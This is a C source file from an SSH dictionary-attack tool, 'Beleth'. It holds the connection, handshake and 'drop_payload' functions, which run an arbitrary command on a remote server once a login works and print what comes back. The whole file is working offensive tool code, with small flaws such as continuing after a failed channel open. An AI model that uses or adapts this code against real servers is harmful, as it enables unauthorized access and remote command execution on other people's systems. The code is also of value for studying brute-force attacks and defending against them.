/*
 * Beleth - SSH Dictionary Attack
 * ssh.c -- SSH connection handling functions
 */

#include <libssh2.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include "beleth.h"
#include "ssh.h"
#include "lists.h"

/*
 * Taken from libssh2 examples
 * Used while dropping the payload and waiting for the response.
 */
int waitsocket(int socket_fd, LIBSSH2_SESSION *session) {
	int rc;
	int dir;
	fd_set fd;
	fd_set *writefd = NULL;
	fd_set *readfd = NULL;
	struct timeval timeout = {
		.tv_sec = 10, /* 10 seconds at most */
		.tv_usec = 0  /* nanoseconds */
	};

	FD_ZERO(&fd);

	FD_SET(socket_fd, &fd);

	/* now make sure we wait in the correct direction */
	dir = libssh2_session_block_directions(session);

	if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
		readfd = &fd;

	if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
		writefd = &fd;

	rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);

	return rc;
}

/*
 * Close libssh2 variables out and terminate sockfd
 */
void session_cleanup(int sock, LIBSSH2_SESSION *session) {
	libssh2_session_disconnect(session, "exit");
	libssh2_session_free(session);
	close(sock);
}

/*
 * Setup socket file descriptor with a connection
 * to char *host using int port
 * session pointer should be properly initialized prior to calling this
 * session = libssh2_session_init();
 */
int session_init(char *host, int port, LIBSSH2_SESSION *session) {
	int sock,rc;
	unsigned long hostaddr;
	struct sockaddr_in sin;

	hostaddr = inet_addr(host);

	sock = socket(AF_INET, SOCK_STREAM, 0);

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = hostaddr;
	if (connect(sock, (struct sockaddr*)(&sin),
				sizeof(struct sockaddr_in)) != 0) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr,"[!] Connect error\n");
		return -1;
	}

	libssh2_session_set_timeout(session, 4000);

	if ((rc=libssh2_session_handshake(session, sock))) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr,"[!] ssh handshake error (%d) with %s:%d\n",rc,host,port);
		return -1;
	}

	return sock;

}

/*
 * drop_payload
 * Send command to remote server on connect.
 * Returns -1 on error, 1 on success.
 */
int drop_payload(int sock, LIBSSH2_SESSION *session, char *cmdline) {
	int rc;
	LIBSSH2_CHANNEL *channel;

	/* Request a shell */
	if (!(channel = libssh2_channel_open_session(session))) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr, "[!] Unable to open a session\n");
		session_cleanup(sock, session);
	}

	/* Execute cmdline remotely and display response */
	while ( ( rc = libssh2_channel_exec(channel, cmdline) ) == LIBSSH2_ERROR_EAGAIN )
		waitsocket(sock,session);

	if (rc != 0) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr, "[!] CMD Exec failed.\n");
		return -1;
	}

	while(1) {
		do
		{
			char buffer[65535];
			rc = libssh2_channel_read( channel, buffer, sizeof(buffer) );

			if (rc > 0)
				printf("[*] %s",buffer);
		}while (rc > 0);

		if ( rc == LIBSSH2_ERROR_EAGAIN )
			waitsocket(sock, session);
		else
			break;
	}

	while ( (rc = libssh2_channel_close(channel)) == LIBSSH2_ERROR_EAGAIN )
		waitsocket(sock,session);

	if (channel) {
		libssh2_channel_free(channel);

		channel = NULL;
	}

	return 1;
}
